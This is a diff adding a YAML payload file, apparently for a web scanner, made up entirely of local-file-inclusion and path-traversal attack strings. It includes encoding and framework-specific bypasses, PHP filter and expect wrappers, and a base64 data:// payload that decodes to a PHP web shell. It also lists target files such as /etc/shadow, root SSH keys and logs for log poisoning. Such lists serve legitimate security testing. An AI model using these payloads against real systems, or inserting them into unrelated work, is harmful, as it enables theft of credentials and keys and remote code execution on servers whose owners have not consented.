@@ -1,0 +1,47 @@
+# payloads/lfi.yml
+# Expert-level Path Traversal, LFI, and OS/Framework-specific inclusion vectors
+
+traversal_bypass:
+  # Advanced Encodings & Normalization
+  - "....//....//....//....//....//etc/passwd"
+  - "..%252f..%252f..%252f..%252fetc/passwd"     # Double URL encoding
+  - "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd" # Unicode/UTF-8 overlong
+  - "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd" # Full-width solidus
+  - "%252e%252e%252f%252e%252e%252fetc/passwd"   # Double encoded dots and slashes
+  - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"      # Backslash encoding (Windows/IIS)
+
+  # Framework Specific (Spring/Java/Tomcat)
+  - "..;/..;/..;/..;/etc/passwd"                 # Matrix parameters bypass
+  - "/;///..;/..;/..;/etc/passwd"                # Tomcat normalization break
+
+  # Path Normalization & Logic Bypasses
+  - "/var/www/html/../../../etc/passwd"          # Absolute path anchor
+  - "/etc/passwd%00.png"                         # Null byte extension bypass (PHP < 5.3)
+  - ".//.//.//.//.//.//etc/passwd"               # Regex normalization bypass
+  - "/images../etc/passwd"                       # Nginx off-by-slash misconfiguration
+
+php_wrappers:
+  # Chained wrappers for deep WAF evasion and execution
+  - "php://filter/convert.base64-encode/resource=index.php"
+  - "php://filter/read=string.rot13/resource=index.php"
+  - "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
+  - "php://filter/zlib.deflate/convert.base64-encode/resource=config.php" # Chained evasion
+  - "expect://id"
+  - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGxEb25lJzsgPz4+"
+  - "phar://test.zip/test.txt"
+
+high_value_targets:
+  linux:
+    - "/etc/passwd"
+    - "/etc/shadow"
+    - "/etc/issue"
+    - "/proc/self/environ"        # LFI to RCE via User-Agent poisoning
+    - "/proc/self/cmdline"        # Process exposure
+    - "/proc/net/arp"             # Internal network layout
+    - "/root/.ssh/id_rsa"         # SSH keys
+    - "/var/log/auth.log"         # Log poisoning target
+    - "/var/log/nginx/access.log" # Log poisoning target
+  windows:
+    - "/windows/win.ini"
+    - "/windows/system32/drivers/etc/hosts"
+    - "C:/inetpub/logs/LogFiles/W3SVC1/u_ex200101.log" # IIS logs
